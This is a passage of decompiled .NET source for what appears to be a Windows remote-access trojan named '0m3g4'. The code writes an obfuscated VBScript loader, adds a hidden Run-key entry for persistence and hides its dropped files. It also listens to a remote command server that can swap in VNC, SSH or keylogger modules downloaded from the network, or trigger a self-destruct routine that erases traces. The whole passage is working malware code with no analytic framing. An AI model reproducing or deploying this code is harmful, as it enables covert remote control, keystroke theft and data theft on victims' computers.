        StreamWriter streamWriter2 = new StreamWriter((Stream) fileStream2);
label_37:
        num3 = 39;
        streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
label_38:
        num3 = 40;
        streamWriter2.WriteLine("'Sneaky Vbs");
label_39:
        num3 = 41;
        streamWriter2.WriteLine("On Error Resume Next");
label_40:
        num3 = 42;
        streamWriter2.WriteLine("Randomize");
label_41:
        num3 = 43;
        streamWriter2.WriteLine("set fso = CreateObject(\"Scripting.FileSystemObject\")");
label_42:
        num3 = 44;
        streamWriter2.WriteLine("fileName = \"" + this.TempFolder + "\\0m3g4-" + str1 + ".txt\"");
label_43:
        num3 = 45;
        streamWriter2.WriteLine("set src = fso.OpenTextfile(fileName,1)");
label_44:
        num3 = 46;
        streamWriter2.WriteLine("body = src.readall");
label_45:
        num3 = 47;
        streamWriter2.WriteLine("set rep = fso.createtextfile(\"" + this.PersistentFolder + "\\OverTime.vbs\",true)");
label_46:
        num3 = 48;
        streamWriter2.WriteLine("rep.writeline \"Execute(\" & Obfuscate(body) & \" ) \"");
label_47:
        num3 = 49;
        streamWriter2.WriteLine("");
label_48:
        num3 = 50;
        streamWriter2.WriteLine("Function Obfuscate(txt)");
label_49:
        num3 = 51;
        streamWriter2.WriteLine("enc = \"\"");
label_50:
        num3 = 52;
        streamWriter2.WriteLine("For i = 1 To len(txt)");
label_51:
        num3 = 53;
        streamWriter2.WriteLine("enc = enc & \"chr( \" & form( asc(mid(txt,i,1)) ) & \" ) & \"");
label_52:
        num3 = 54;
        streamWriter2.WriteLine("next");
label_53:
        num3 = 55;
        streamWriter2.WriteLine("Obfuscate = enc & \" vbcrlf \"");
label_54:
        num3 = 56;
        streamWriter2.WriteLine("End Function");
label_55:
        num3 = 57;
        streamWriter2.WriteLine("");
label_56:
        num3 = 58;
        streamWriter2.WriteLine("");
label_57:
        num3 = 59;
        streamWriter2.WriteLine("");
label_58:
        num3 = 60;
        streamWriter2.WriteLine("Function form(n)");
label_59:
        num3 = 61;
        streamWriter2.WriteLine("r = int(rnd * 10000)");
label_60:
        num3 = 62;
        streamWriter2.WriteLine("k = int(rnd * 3)");
label_61:
        num3 = 63;
        streamWriter2.WriteLine("if(k = 0) then ret = (r+n) & \"-\" & r");
label_62:
        num3 = 64;
        streamWriter2.WriteLine("if(k = 1) then ret = (n-r) & \"+\" & r");
label_63:
        num3 = 65;
        streamWriter2.WriteLine("if(k = 2) then ret = (n*r) & \"/\" & r");
label_64:
        num3 = 66;
        streamWriter2.WriteLine("form = ret");
label_65:
        num3 = 67;
        streamWriter2.WriteLine("End Function");
label_66:
        num3 = 68;
        streamWriter2.Close();
label_67:
        num3 = 69;
        FileStream fileStream3 = new FileStream(this.PersistentFolder + "\\0m3g4-" + str1 + ".bat", FileMode.Create, FileAccess.Write);
label_68:
        num3 = 70;
        StreamWriter streamWriter3 = new StreamWriter((Stream) fileStream3);
label_69:
        num3 = 71;
        streamWriter3.BaseStream.Seek(0L, SeekOrigin.End);
label_70:
        num3 = 72;
        streamWriter3.WriteLine("tskill lsess");
label_71:
        num3 = 73;
        streamWriter3.WriteLine("tskill svchest");
label_72:
        num3 = 74;
        streamWriter3.WriteLine("tskill *Resume*");
label_73:
        num3 = 75;
        streamWriter3.WriteLine("tskill *Birth*");
label_74:
        num3 = 76;
        streamWriter3.WriteLine("tskill *TaxRecord*");
label_75:
        num3 = 77;
        streamWriter3.WriteLine("tskill *Medical*");
label_76:
        num3 = 78;
        streamWriter3.WriteLine("tskill *Angelina*");
label_77:
        num3 = 79;
        streamWriter3.WriteLine("tskill *0m3g4*");
label_78:
        num3 = 80;
        streamWriter3.WriteLine("start " + str3);
label_79:
        num3 = 81;
        streamWriter3.Close();
label_80:
        num3 = 82;
        FileStream fileStream4 = new FileStream(this.PersistentFolder + "\\0m3g4-hidden.vbs", FileMode.Create, FileAccess.Write);
label_81:
        num3 = 83;
        StreamWriter streamWriter4 = new StreamWriter((Stream) fileStream4);
label_82:
        num3 = 84;
        streamWriter4.BaseStream.Seek(0L, SeekOrigin.End);
label_83:
        num3 = 85;
        streamWriter4.WriteLine("Set WshShell = WScript.CreateObject(\"WScript.Shell\")");
label_84:
        num3 = 86;
        streamWriter4.WriteLine("WshShell.Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\" & sargs, 0, False");
label_85:
        num3 = 87;
        streamWriter4.Close();
label_86:
        num3 = 88;
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("patience", (object) (this.PersistentFolder + "\\OverTime.vbs"));
label_87:
        num3 = 89;
        Thread.Sleep(1000);
label_88:
        num3 = 90;
        Process.Start(this.TempFolder + "\\0m3g4-" + str1 + ".vbs");
label_89:
        num3 = 91;
        Thread.Sleep(3000);
label_90:
        num3 = 92;
        Process.Start(this.PersistentFolder + "\\OverTime.vbs");
label_91:
        num3 = 93;
        Thread.Sleep(3000);
label_92:
        num3 = 94;
        FileInfo fileInfo1 = new FileInfo(this.TempFolder + "\\0m3g4-" + str1 + ".vbs");
label_93:
        num3 = 95;
        FileInfo fileInfo2 = new FileInfo(this.TempFolder + "\\0m3g4-" + str1 + ".txt");
label_94:
        num3 = 96;
        System.IO.File.SetAttributes(this.PersistentFolder + "\\OverTime.vbs", FileAttributes.Hidden);
label_95:
        num3 = 97;
        System.IO.File.SetAttributes(this.PersistentFolder + "\\0m3g4-hidden.vbs", FileAttributes.Hidden);
label_96:
        num3 = 98;
        System.IO.File.SetAttributes(this.PersistentFolder + "\\0m3g4-" + str1 + ".bat", FileAttributes.Hidden);
label_97:
        num3 = 99;
        fileInfo1.Delete();
label_98:
        num3 = 100;
        fileInfo2.Delete();
        goto label_105;
label_100:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
              case 9:
              case 13:
                goto label_11;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 10:
                goto label_8;
              case 11:
                goto label_9;
              case 12:
                goto label_10;
              case 14:
                goto label_12;
              case 15:
                goto label_13;
              case 16:
                goto label_14;
              case 17:
                goto label_15;
              case 18:
                goto label_16;
              case 19:
                goto label_17;
              case 20:
                goto label_18;
              case 21:
                goto label_19;
              case 22:
                goto label_20;
              case 23:
                goto label_21;
              case 24:
                goto label_22;
              case 25:
                goto label_23;
              case 26:
                goto label_24;
              case 27:
                goto label_25;
              case 28:
                goto label_26;
              case 29:
                goto label_27;
              case 30:
                goto label_28;
              case 31:
                goto label_29;
              case 32:
                goto label_30;
              case 33:
                goto label_31;
              case 34:
                goto label_32;
              case 35:
                goto label_33;
              case 36:
                goto label_34;
              case 37:
                goto label_35;
              case 38:
                goto label_36;
              case 39:
                goto label_37;
              case 40:
                goto label_38;
              case 41:
                goto label_39;
              case 42:
                goto label_40;
              case 43:
                goto label_41;
              case 44:
                goto label_42;
              case 45:
                goto label_43;
              case 46:
                goto label_44;
              case 47:
                goto label_45;
              case 48:
                goto label_46;
              case 49:
                goto label_47;
              case 50:
                goto label_48;
              case 51:
                goto label_49;
              case 52:
                goto label_50;
              case 53:
                goto label_51;
              case 54:
                goto label_52;
              case 55:
                goto label_53;
              case 56:
                goto label_54;
              case 57:
                goto label_55;
              case 58:
                goto label_56;
              case 59:
                goto label_57;
              case 60:
                goto label_58;
              case 61:
                goto label_59;
              case 62:
                goto label_60;
              case 63:
                goto label_61;
              case 64:
                goto label_62;
              case 65:
                goto label_63;
              case 66:
                goto label_64;
              case 67:
                goto label_65;
              case 68:
                goto label_66;
              case 69:
                goto label_67;
              case 70:
                goto label_68;
              case 71:
                goto label_69;
              case 72:
                goto label_70;
              case 73:
                goto label_71;
              case 74:
                goto label_72;
              case 75:
                goto label_73;
              case 76:
                goto label_74;
              case 77:
                goto label_75;
              case 78:
                goto label_76;
              case 79:
                goto label_77;
              case 80:
                goto label_78;
              case 81:
                goto label_79;
              case 82:
                goto label_80;
              case 83:
                goto label_81;
              case 84:
                goto label_82;
              case 85:
                goto label_83;
              case 86:
                goto label_84;
              case 87:
                goto label_85;
              case 88:
                goto label_86;
              case 89:
                goto label_87;
              case 90:
                goto label_88;
              case 91:
                goto label_89;
              case 92:
                goto label_90;
              case 93:
                goto label_91;
              case 94:
                goto label_92;
              case 95:
                goto label_93;
              case 96:
                goto label_94;
              case 97:
                goto label_95;
              case 98:
                goto label_96;
              case 99:
                goto label_97;
              case 100:
                goto label_98;
              case 101:
                goto label_105;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_100;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_105:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void SelfDestruct()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        this.Victim_Offline();
label_3:
        num3 = 3;
        string str1 = Conversions.ToString(DateAndTime.Now.TimeOfDay.TotalMilliseconds) + ".old";
label_4:
        num3 = 4;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("XP"))
          goto label_7;
label_5:
        num3 = 5;
        string str2 = this.FilesFolder + "\\lsess.exe";
label_6:
        num3 = 6;
        string path = Environment.SystemDirectory + "\\svchest.exe";
        goto label_12;
label_7:
        num3 = 8;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("Vista"))
          goto label_9;
label_8:
        num3 = 9;
        str2 = this.FilesFolder + "\\lsess.exe";
        goto label_12;
label_9:
        num3 = 11;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("7"))
          goto label_12;
label_10:
        num3 = 12;
        str2 = this.FilesFolder + "\\lsess.exe";
label_11:
        num3 = 13;
        path = this.RootFolder + "ProgramData\\Microsoft\\DeviceSync\\svchest.exe";
label_12:
label_13:
        num3 = 15;
        Process process = new Process();
label_14:
        num3 = 16;
        string str3 = "tskill.exe";
label_15:
        num3 = 17;
        process.StartInfo.Arguments = "wscript";
label_16:
        num3 = 18;
        process.StartInfo.FileName = str3;
label_17:
        num3 = 19;
        process.StartInfo.UseShellExecute = false;
label_18:
        num3 = 20;
        process.StartInfo.RedirectStandardOutput = true;
label_19:
        num3 = 21;
        process.StartInfo.CreateNoWindow = true;
label_20:
        num3 = 22;
        process.Start();
label_21:
        num3 = 23;
        process.WaitForExit();
label_22:
        num3 = 24;
        System.IO.File.Move(Application.StartupPath + "\\" + this.appname, MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\" + str1);
label_23:
        num3 = 25;
        if (!System.IO.File.Exists(path))
          goto label_25;
label_24:
        num3 = 26;
        System.IO.File.Delete(path);
label_25:
        num3 = 28;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("XP"))
          goto label_31;
label_26:
        num3 = 29;
        Microsoft.VisualBasic.FileSystem.SetAttr(this.StartupFolder + "\\lsess.exe", FileAttribute.Normal);
label_27:
        num3 = 30;
        if (!MyProject.Computer.FileSystem.FileExists(this.StartupFolder + "\\lsess.exe"))
          goto label_29;
label_28:
        num3 = 31;
        System.IO.File.Delete(this.StartupFolder + "\\lsess.exe");
label_29:
        num3 = 33;
        if (!MyProject.Computer.FileSystem.FileExists(this.StartupFolder + "\\svchest.exe"))
          goto label_37;
label_30:
        num3 = 34;
        System.IO.File.Delete(this.StartupFolder + "\\svchest.exe");
        goto label_37;
label_31:
        num3 = 37;
        if (!(MyProject.Computer.Info.OSFullName.ToString().Contains("Vista") | MyProject.Computer.Info.OSFullName.ToString().Contains("7")))
          goto label_37;
label_32:
        num3 = 38;
        Microsoft.VisualBasic.FileSystem.SetAttr(this.StartupFolder + "\\lsess.exe", FileAttribute.Normal);
label_33:
        num3 = 39;
        if (!MyProject.Computer.FileSystem.FileExists(this.StartupFolder + "\\lsess.exe"))
          goto label_35;
label_34:
        num3 = 40;
        System.IO.File.Delete(this.StartupFolder + "\\lsess.exe");
label_35:
        num3 = 42;
        if (!MyProject.Computer.FileSystem.FileExists(this.StartupFolder + "\\svchest.exe"))
          goto label_37;
label_36:
        num3 = 43;
        System.IO.File.Delete(this.StartupFolder + "\\svchest.exe");
label_37:
label_38:
        num3 = 46;
        MyProject.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("svcfile");
label_39:
        num3 = 47;
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("sysfile");
label_40:
        num3 = 48;
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("patience");
label_41:
        num3 = 49;
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Om3g4", true).DeleteValue("CurrentVersion");
label_42:
        num3 = 50;
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Om3g4", true).DeleteValue("Om3g4D");
label_43:
        num3 = 51;
        if (!Directory.Exists(this.ServerExchangeFolder))
          goto label_45;
label_44:
        num3 = 52;
        MyProject.Computer.FileSystem.DeleteDirectory(this.ServerExchangeFolder.Replace("e\\", "e"), DeleteDirectoryOption.DeleteAllContents);
label_45:
label_46:
        num3 = 54;
        this.SelfDestructNotify();
label_47:
        num3 = 55;
        Thread.Sleep(2000);
label_48:
        num3 = 56;
        Application.Exit();
        goto label_55;
label_50:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
              case 10:
              case 14:
                goto label_12;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 11:
                goto label_9;
              case 12:
                goto label_10;
              case 13:
                goto label_11;
              case 15:
                goto label_13;
              case 16:
                goto label_14;
              case 17:
                goto label_15;
              case 18:
                goto label_16;
              case 19:
                goto label_17;
              case 20:
                goto label_18;
              case 21:
                goto label_19;
              case 22:
                goto label_20;
              case 23:
                goto label_21;
              case 24:
                goto label_22;
              case 25:
                goto label_23;
              case 26:
                goto label_24;
              case 27:
              case 28:
                goto label_25;
              case 29:
                goto label_26;
              case 30:
                goto label_27;
              case 31:
                goto label_28;
              case 32:
              case 33:
                goto label_29;
              case 34:
                goto label_30;
              case 35:
              case 36:
              case 44:
              case 45:
                goto label_37;
              case 37:
                goto label_31;
              case 38:
                goto label_32;
              case 39:
                goto label_33;
              case 40:
                goto label_34;
              case 41:
              case 42:
                goto label_35;
              case 43:
                goto label_36;
              case 46:
                goto label_38;
              case 47:
                goto label_39;
              case 48:
                goto label_40;
              case 49:
                goto label_41;
              case 50:
                goto label_42;
              case 51:
                goto label_43;
              case 52:
                goto label_44;
              case 53:
                goto label_45;
              case 54:
                goto label_46;
              case 55:
                goto label_47;
              case 56:
                goto label_48;
              case 57:
                goto label_55;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_50;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_55:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void ServerExchange()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        string str1 = this.TempFolder + "\\" + this.ExchangeServer + ".txt";
label_3:
        num3 = 3;
        string file = this.TempFolder + "\\" + this.ExchangeServer + ".exe";
label_4:
        num3 = 4;
        string str2 = this.TempFolder + "\\" + this.ExchangeServer + ".rar";
label_5:
        num3 = 5;
        string str3 = this.TempFolder + "\\0m3g4-Version.txt";
label_6:
        num3 = 6;
        string str4 = Conversions.ToString(DateAndTime.Now.TimeOfDay.TotalMilliseconds) + ".old";
label_7:
        num3 = 7;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("XP"))
          goto label_10;
label_8:
        num3 = 8;
        string str5 = this.FilesFolder + "\\lsess.exe";
label_9:
        num3 = 9;
        string path = Environment.SystemDirectory + "\\svchest.exe";
        goto label_15;
label_10:
        num3 = 11;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("Vista"))
          goto label_12;
label_11:
        num3 = 12;
        str5 = this.FilesFolder + "\\lsess.exe";
        goto label_15;
label_12:
        num3 = 14;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("7"))
          goto label_15;
label_13:
        num3 = 15;
        str5 = this.FilesFolder + "\\lsess.exe";
label_14:
        num3 = 16;
        path = this.RootFolder + "ProgramData\\Microsoft\\DeviceSync\\svchest.exe";
label_15:
label_16:
        num3 = 18;
        Process process1 = new Process();
label_17:
        num3 = 19;
        string str6 = "tskill.exe";
label_18:
        num3 = 20;
        process1.StartInfo.Arguments = "wscript";
label_19:
        num3 = 21;
        process1.StartInfo.FileName = str6;
label_20:
        num3 = 22;
        process1.StartInfo.UseShellExecute = false;
label_21:
        num3 = 23;
        process1.StartInfo.RedirectStandardOutput = true;
label_22:
        num3 = 24;
        process1.StartInfo.CreateNoWindow = true;
label_23:
        num3 = 25;
        process1.Start();
label_24:
        num3 = 26;
        process1.WaitForExit();
label_25:
        num3 = 27;
        System.IO.File.Move(Application.StartupPath + "\\" + this.appname, this.TempFolder + "\\" + str4);
label_26:
        num3 = 28;
        if (!System.IO.File.Exists(path))
          goto label_28;
label_27:
        num3 = 29;
        System.IO.File.Delete(path);
label_28:
        num3 = 31;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("XP"))
          goto label_34;
label_29:
        num3 = 32;
        Microsoft.VisualBasic.FileSystem.SetAttr(this.StartupFolder + "\\lsess.exe", FileAttribute.Normal);
label_30:
        num3 = 33;
        if (!MyProject.Computer.FileSystem.FileExists(this.StartupFolder + "\\lsess.exe"))
          goto label_32;
label_31:
        num3 = 34;
        System.IO.File.Delete(this.StartupFolder + "\\lsess.exe");
label_32:
        num3 = 36;
        if (!MyProject.Computer.FileSystem.FileExists(this.StartupFolder + "\\svchest.exe"))
          goto label_40;
label_33:
        num3 = 37;
        System.IO.File.Delete(this.StartupFolder + "\\svchest.exe");
        goto label_40;
label_34:
        num3 = 40;
        if (!(MyProject.Computer.Info.OSFullName.ToString().Contains("Vista") | MyProject.Computer.Info.OSFullName.ToString().Contains("7")))
          goto label_40;
label_35:
        num3 = 41;
        Microsoft.VisualBasic.FileSystem.SetAttr(this.StartupFolder + "\\lsess.exe", FileAttribute.Normal);
label_36:
        num3 = 42;
        if (!MyProject.Computer.FileSystem.FileExists(this.StartupFolder + "\\lsess.exe"))
          goto label_38;
label_37:
        num3 = 43;
        System.IO.File.Delete(this.StartupFolder + "\\lsess.exe");
label_38:
        num3 = 45;
        if (!MyProject.Computer.FileSystem.FileExists(this.StartupFolder + "\\svchest.exe"))
          goto label_40;
label_39:
        num3 = 46;
        System.IO.File.Delete(this.StartupFolder + "\\svchest.exe");
label_40:
label_41:
        num3 = 49;
        MyProject.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("svcfile");
label_42:
        num3 = 50;
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("sysfile");
label_43:
        num3 = 51;
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("patience");
label_44:
        num3 = 52;
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Om3g4", true).DeleteValue("CurrentVersion");
label_45:
        num3 = 53;
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Om3g4", true).DeleteValue("Om3g4D");
label_46:
        num3 = 54;
        this.Victim_Offline();
label_47:
        num3 = 55;
        if (!MyProject.Computer.FileSystem.FileExists(file))
          goto label_49;
label_48:
        num3 = 56;
        MyProject.Computer.FileSystem.DeleteFile(file);
label_49:
        num3 = 58;
        if (!MyProject.Computer.FileSystem.FileExists(str2))
          goto label_51;
label_50:
        num3 = 59;
        MyProject.Computer.FileSystem.DeleteFile(str2);
label_51:
        num3 = 61;
        MyProject.Computer.Network.DownloadFile(this.ExchangeFile, str2);
label_52:
        num3 = 62;
        Process process2 = new Process();
label_53:
        num3 = 63;
        string str7 = this.ToolsFolder + "\\rar.exe";
label_54:
        num3 = 64;
        process2.StartInfo.Arguments = "e -pp1cc1!!o " + str2 + " " + this.TempFolder + "\\";
label_55:
        num3 = 65;
        process2.StartInfo.FileName = str7;
label_56:
        num3 = 66;
        process2.StartInfo.UseShellExecute = false;
label_57:
        num3 = 67;
        process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
label_58:
        num3 = 68;
        process2.StartInfo.CreateNoWindow = true;
label_59:
        num3 = 69;
        process2.Start();
label_60:
        num3 = 70;
        process2.WaitForExit();
label_61:
        num3 = 71;
        FileInfo fileInfo1 = new FileInfo(str2);
label_62:
        num3 = 72;
        fileInfo1.Delete();
label_63:
        num3 = 73;
        FileStream fileStream = new FileStream(this.TempFolder + "\\0m3g4-Restart.bat", FileMode.Create, FileAccess.Write);
label_64:
        num3 = 74;
        StreamWriter streamWriter = new StreamWriter((Stream) fileStream);
label_65:
        num3 = 75;
        streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
label_66:
        num3 = 76;
        streamWriter.WriteLine("tskill wscript");
label_67:
        num3 = 77;
        streamWriter.WriteLine("tskill lsess");
label_68:
        num3 = 78;
        streamWriter.WriteLine("tskill svchest");
label_69:
        num3 = 79;
        streamWriter.WriteLine("ping 127.0.0.1 -n 7 >%tmp%\\nul");
label_70:
        num3 = 80;
        streamWriter.WriteLine("del \"" + this.TempFolder + "\\" + str4 + "\"");
label_71:
        num3 = 81;
        streamWriter.WriteLine("del \"" + str1 + "\"");
label_72:
        num3 = 82;
        streamWriter.WriteLine("del \"" + str3 + "\"");
label_73:
        num3 = 83;
        streamWriter.WriteLine("ping 127.0.0.1 -n 5 >%tmp%\\nul");
label_74:
        num3 = 84;
        streamWriter.WriteLine("start " + file);
label_75:
        num3 = 85;
        streamWriter.Close();
label_76:
        num3 = 86;
        this.ExchangeNotify();
label_77:
        num3 = 87;
        Process process3 = new Process();
label_78:
        num3 = 88;
        string fileName = this.TempFolder + "\\0m3g4-Restart.bat";
label_79:
        num3 = 89;
        process3.StartInfo.FileName = fileName;
label_80:
        num3 = 90;
        process3.StartInfo.UseShellExecute = false;
label_81:
        num3 = 91;
        process3.StartInfo.CreateNoWindow = true;
label_82:
        num3 = 92;
        process3.Start();
label_83:
        num3 = 93;
        process3.WaitForExit();
label_84:
        num3 = 94;
        FileInfo fileInfo2 = new FileInfo(fileName);
label_85:
        num3 = 95;
        fileInfo2.Delete();
label_86:
        num3 = 96;
        Application.Exit();
        goto label_93;
label_88:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
              case 13:
              case 17:
                goto label_15;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 14:
                goto label_12;
              case 15:
                goto label_13;
              case 16:
                goto label_14;
              case 18:
                goto label_16;
              case 19:
                goto label_17;
              case 20:
                goto label_18;
              case 21:
                goto label_19;
              case 22:
                goto label_20;
              case 23:
                goto label_21;
              case 24:
                goto label_22;
              case 25:
                goto label_23;
              case 26:
                goto label_24;
              case 27:
                goto label_25;
              case 28:
                goto label_26;
              case 29:
                goto label_27;
              case 30:
              case 31:
                goto label_28;
              case 32:
                goto label_29;
              case 33:
                goto label_30;
              case 34:
                goto label_31;
              case 35:
              case 36:
                goto label_32;
              case 37:
                goto label_33;
              case 38:
              case 39:
              case 47:
              case 48:
                goto label_40;
              case 40:
                goto label_34;
              case 41:
                goto label_35;
              case 42:
                goto label_36;
              case 43:
                goto label_37;
              case 44:
              case 45:
                goto label_38;
              case 46:
                goto label_39;
              case 49:
                goto label_41;
              case 50:
                goto label_42;
              case 51:
                goto label_43;
              case 52:
                goto label_44;
              case 53:
                goto label_45;
              case 54:
                goto label_46;
              case 55:
                goto label_47;
              case 56:
                goto label_48;
              case 57:
              case 58:
                goto label_49;
              case 59:
                goto label_50;
              case 60:
              case 61:
                goto label_51;
              case 62:
                goto label_52;
              case 63:
                goto label_53;
              case 64:
                goto label_54;
              case 65:
                goto label_55;
              case 66:
                goto label_56;
              case 67:
                goto label_57;
              case 68:
                goto label_58;
              case 69:
                goto label_59;
              case 70:
                goto label_60;
              case 71:
                goto label_61;
              case 72:
                goto label_62;
              case 73:
                goto label_63;
              case 74:
                goto label_64;
              case 75:
                goto label_65;
              case 76:
                goto label_66;
              case 77:
                goto label_67;
              case 78:
                goto label_68;
              case 79:
                goto label_69;
              case 80:
                goto label_70;
              case 81:
                goto label_71;
              case 82:
                goto label_72;
              case 83:
                goto label_73;
              case 84:
                goto label_74;
              case 85:
                goto label_75;
              case 86:
                goto label_76;
              case 87:
                goto label_77;
              case 88:
                goto label_78;
              case 89:
                goto label_79;
              case 90:
                goto label_80;
              case 91:
                goto label_81;
              case 92:
                goto label_82;
              case 93:
                goto label_83;
              case 94:
                goto label_84;
              case 95:
                goto label_85;
              case 96:
                goto label_86;
              case 97:
                goto label_93;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_88;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_93:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void HQUplink()
    {
      this.HQ = new TcpClient();
      if (this.HQ.Connected)
        return;
      try
      {
        this.HQ.Connect(this.RemoteNotifier, Conversions.ToInteger(this.HQUpLinkPort));
        Thread.Sleep(2000);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Thread.Sleep(15000);
        ProjectData.ClearProjectError();
      }
    }

    private void RecieveOrders()
    {
      if (!this.HQ.Connected)
        this.HQUplink();
      if (!this.HQ.Connected)
        return;
      this.HQ.SendTimeout = 5000;
      try
      {
        lock (this.HQ.GetStream())
        {
          StreamReader streamReader = new StreamReader((Stream) this.HQ.GetStream());
          this.Orders = (string) null;
          while (streamReader.Peek() > -1)
            this.Orders += Convert.ToChar(streamReader.Read()).ToString();
          if (Operators.CompareString(this.Orders, "Vnc-Exchange", false) == 0)
          {
            this.ExchangeFile = (string) null;
            this.ExchangeServer = (string) null;
            this.ExchangeFile = this.VncFile;
            this.ExchangeServer = "0m3g4-Vnc";
            this.ServerExchange();
          }
          else if (Operators.CompareString(this.Orders, "sSH-Exchange", false) == 0)
          {
            this.ExchangeFile = (string) null;
            this.ExchangeServer = (string) null;
            this.ExchangeFile = this.sSHFile;
            this.ExchangeServer = "0m3g4-sSH";
            this.ServerExchange();
          }
          else if (Operators.CompareString(this.Orders, "KeyLogger-Exchange", false) == 0)
          {
            this.ExchangeFile = (string) null;
            this.ExchangeServer = (string) null;
            this.ExchangeFile = this.KeyLoggerFile;
            this.ExchangeServer = "0m3g4-KeyLogger";
            this.ServerExchange();
          }
          else if (Operators.CompareString(this.Orders, "Classified", false) == 0)
            this.TheXFiles();
          else if (Operators.CompareString(this.Orders, "Self-Destruct", false) == 0)
            this.SelfDestruct();
        }
        this.HQ.Client.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.RecieveOrders();
        ProjectData.ClearProjectError();
      }
    }

    private void Server()
    {
      this.HQ = new TcpClient();
      while (!this.HQ.Connected)
        this.HQUplink();
      while (true)
        this.RecieveOrders();
    }
  }
}
